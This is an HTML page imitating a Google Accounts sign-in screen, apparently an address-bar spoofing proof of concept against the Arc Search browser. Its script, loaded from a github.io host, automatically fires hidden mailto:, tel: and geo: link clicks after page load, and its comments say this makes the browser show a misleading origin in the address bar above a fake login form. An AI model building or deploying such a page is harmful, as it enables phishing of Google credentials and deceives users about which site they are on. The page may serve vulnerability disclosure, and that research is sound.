<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sign in – Google Accounts</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: Arial, sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 24px;
      min-height: 100vh;
    }
    .logo { margin-bottom: 32px; }
    .card {
      width: 100%;
      max-width: 380px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      padding: 36px 36px 28px;
    }
    h1 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
    .sub { font-size: 16px; color: #202124; text-align: center; margin-bottom: 28px; }
    input {
      width: 100%; padding: 14px 12px;
      border: 1px solid #dadce0; border-radius: 4px;
      font-size: 16px; margin-bottom: 20px; outline: none;
    }
    input:focus { border-color: #1a73e8; border-width: 2px; }
    .hint { font-size: 13px; color: #202124; margin-bottom: 24px; line-height: 1.5; }
    .hint a { color: #1a73e8; text-decoration: none; }
    .row { display: flex; justify-content: space-between; align-items: center; }
    .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; }
    .next {
      background: #1a73e8; color: #fff;
      border: none; border-radius: 4px;
      padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
    }
  </style>
</head>

<div class="card">
  <h1>Sign in</h1>
  <p class="sub">to continue to Google</p>
  <input type="email" placeholder="Email or phone">
  <p class="hint">
    Not your computer? Use Guest mode to sign in privately.
    <a href="#">Learn more</a>
  </p>
  <div class="row">
    <a href="#" class="create">Create account</a>
    <button class="next">Next</button>
  </div>
</div>

<script>
  // THIS is the key trigger — fires from domain B (intanjelek.github.io) origin
  // Arc Search Navigation Delegate will read THIS page's origin for the address bar

  function triggerNav() {
    var schemes = [
      'mailto:spoof@example.com',  // most common, least disruptive
      'tel:+1234567890',
      'geo:0,0'
    ];

    var i = 0;
    function tryNext() {
      if (i >= schemes.length) return;
      try {
        // Use anchor click — cleaner than location.href, less likely to navigate away
        var a = document.createElement('a');
        a.href = schemes[i];
        a.style.display = 'none';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
      } catch(e) {}
      i++;
      // Try each scheme 200ms apart
      setTimeout(tryNext, 200);
    }

    tryNext();
  }

  // Fire after page renders (not too early)
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      setTimeout(triggerNav, 100);
    });
  } else {
    setTimeout(triggerNav, 100);
  }
</script>

</body>
</html>
